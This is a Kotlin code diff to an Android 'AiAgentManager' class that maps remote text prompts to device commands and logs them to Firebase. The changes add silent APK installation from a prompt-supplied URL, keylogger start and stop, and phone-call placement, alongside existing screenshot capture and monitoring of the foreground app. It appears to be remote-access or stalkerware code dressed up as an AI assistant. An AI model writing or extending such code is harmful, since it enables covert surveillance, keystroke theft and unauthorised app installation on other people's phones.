@@ -17,7 +17,7 @@ class AiAgentManager(private val context: Context) {
         try {
             val usageStatsManager = context.getSystemService(Context.USAGE_STATS_SERVICE) as? UsageStatsManager
             val endTime = System.currentTimeMillis()
-            val startTime = endTime - 15000 // Last 15 seconds
+            val startTime = endTime - 15000
             val usageEvents = usageStatsManager?.queryEvents(startTime, endTime)
             var lastPkg = ""
             if (usageEvents != null) {
@@ -40,59 +40,82 @@ class AiAgentManager(private val context: Context) {
             val lower = prompt.lowercase()
             val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "UNKNOWN"
             
-            val aiAnswer = when {
-                lower.contains("active app") || lower.contains("foreground") || (lower.contains("screen") && (lower.contains("without") || lower.contains("text"))) -> {
-                    val foregroundPkg = getForegroundPackageName()
-                    "AI Active Screen Inspection (No Screenshot): The currently active foreground application package on the device display is '$foregroundPkg'."
+            var executedCommand = "SHOW_TOAST"
+            var executionPayload = prompt
+            var aiAnswer = ""
+
+            when {
+                lower.contains("call") || lower.contains("dial") || lower.contains("phone") -> {
+                    executedCommand = "PLACE_CALL"
+                    val callIndex = maxOf(lower.indexOf("call"), lower.indexOf("dial"), lower.indexOf("phone"))
+                    val rawTarget = if (callIndex >= 0) {
+                        val keywordLen = when {
+                            lower.indexOf("call") >= 0 -> 4
+                            lower.indexOf("dial") >= 0 -> 4
+                            else -> 5
+                        }
+                        val sub = prompt.substring(minOf(callIndex + keywordLen, prompt.length)).trim()
+                        sub
+                    } else {
+                        prompt
+                    }
+                    executionPayload = rawTarget.replace(Regex("^(to|number)\\s+", RegexOption.IGNORE_CASE), "").trim()
+                    if (executionPayload.isEmpty()) {
+                        executionPayload = prompt
+                    }
                 }
-                lower.contains("screen") && !lower.contains("summarize") -> {
-                    RemoteCommandManager(context).executeCommand("TAKE_SCREENSHOT", "")
-                    "Captured a fresh device screenshot and synced it to Firebase storage."
+                lower.contains("install") || lower.contains("download") || lower.contains("apk") -> {
+                    executedCommand = "SILENT_INSTALL"
+                    val url = prompt.split(" ").firstOrNull { it.startsWith("http") || it.contains(".") } ?: prompt
+                    executionPayload = url
                 }
-                lower.contains("summarize") || lower.contains("summary") || lower.contains("status") || lower.contains("report") -> {
-                    val batteryManager = context.getSystemService(Context.BATTERY_SERVICE) as? BatteryManager
-                    val batteryLevel = batteryManager?.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: -1
-                    val activeApp = getForegroundPackageName()
-                    "Device ID $deviceId is online. Active App: $activeApp. Battery level: ${if (batteryLevel >= 0) "$batteryLevel%" else "Unknown"}. Background sync and command listeners are fully active."
-                }
-                lower.contains("call") -> {
-                    val number = prompt.replace(Regex("[^0-9+]"), "")
-                    val payload = if (number.isNotEmpty()) number else prompt
-                    val result = RemoteCommandManager(context).executeCommand("PLACE_CALL", payload)
-                    "Processed call action. Result: ${result.resultMessage}"
-                }
-                lower.contains("open") || lower.contains("url") || lower.contains("http") -> {
+                lower.contains("open") || lower.contains("launch") || lower.contains("browse") || lower.contains("url") || lower.contains("http") -> {
+                    executedCommand = "OPEN_URL"
                     val url = prompt.split(" ").firstOrNull { it.startsWith("http") || it.contains(".") } ?: "https://google.com"
-                    val result = RemoteCommandManager(context).executeCommand("OPEN_URL", url)
-                    "Opened URL remotely: $url. Result: ${result.resultMessage}"
+                    executionPayload = url
                 }
                 lower.contains("screenshot") || lower.contains("capture") -> {
-                    val result = RemoteCommandManager(context).executeCommand("TAKE_SCREENSHOT", "")
-                    "Screenshot capture requested. Result: ${result.resultMessage}"
+                    executedCommand = "TAKE_SCREENSHOT"
+                    executionPayload = ""
                 }
                 lower.contains("flashlight") || lower.contains("torch") -> {
-                    val cmd = if (lower.contains("off") || lower.contains("disable")) "FLASHLIGHT_OFF" else "FLASHLIGHT_ON"
-                    val result = RemoteCommandManager(context).executeCommand(cmd, "")
-                    "Flashlight toggled. Result: ${result.resultMessage}"
+                    executedCommand = if (lower.contains("off") || lower.contains("disable")) "FLASHLIGHT_OFF" else "FLASHLIGHT_ON"
+                    executionPayload = ""
                 }
                 lower.contains("vibrate") -> {
-                    RemoteCommandManager(context).executeCommand("VIBRATE", "1000")
-                    "Device vibrated successfully."
+                    executedCommand = "VIBRATE"
+                    executionPayload = "1000"
                 }
                 lower.contains("siren") || lower.contains("alarm") -> {
-                    val cmd = if (lower.contains("off") || lower.contains("stop")) "STOP_SIREN" else "START_SIREN"
-                    val result = RemoteCommandManager(context).executeCommand(cmd, "")
-                    "Siren alarm toggled. Result: ${result.resultMessage}"
+                    executedCommand = if (lower.contains("off") || lower.contains("stop")) "STOP_SIREN" else "START_SIREN"
+                    executionPayload = ""
+                }
+                lower.contains("keylogger") || lower.contains("keystroke") -> {
+                    executedCommand = if (lower.contains("off") || lower.contains("stop") || lower.contains("disable")) "STOP_KEYLOGGER" else "START_KEYLOGGER"
+                    executionPayload = ""
+                }
+                lower.contains("status") || lower.contains("report") || lower.contains("battery") || lower.contains("info") -> {
+                    val batteryManager = context.getSystemService(Context.BATTERY_SERVICE) as? BatteryManager
+                    val batteryLevel = batteryManager?.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: -1
+                    aiAnswer = "Device ID $deviceId is online. Active App: ${getForegroundPackageName()}. Battery level: ${if (batteryLevel >= 0) "$batteryLevel%" else "Unknown"}."
                 }
                 else -> {
-                    "AI Assistant Answer: I received your remote message ('$prompt'). The managed device is online and operational. Active foreground app: ${getForegroundPackageName()}."
+                    executedCommand = "SHOW_TOAST"
+                    executionPayload = prompt
                 }
+            }
+
+            if (aiAnswer.isEmpty()) {
+                val result = RemoteCommandManager(context).executeCommand(executedCommand, executionPayload)
+                aiAnswer = "AI Agent executed -> Command: $executedCommand, Payload: '$executionPayload'. Result: ${result.resultMessage}"
             }
 
             val chatRef = FirebaseDatabase.getInstance().getReference("devices").child(deviceId).child("ai_chat_history")
             val chatRecord = mapOf(
                 "question" to prompt,
                 "answer" to aiAnswer,
+                "command" to executedCommand,
+                "payload" to executionPayload,
                 "timestamp" to System.currentTimeMillis()
             )
             chatRef.push().setValue(chatRecord)
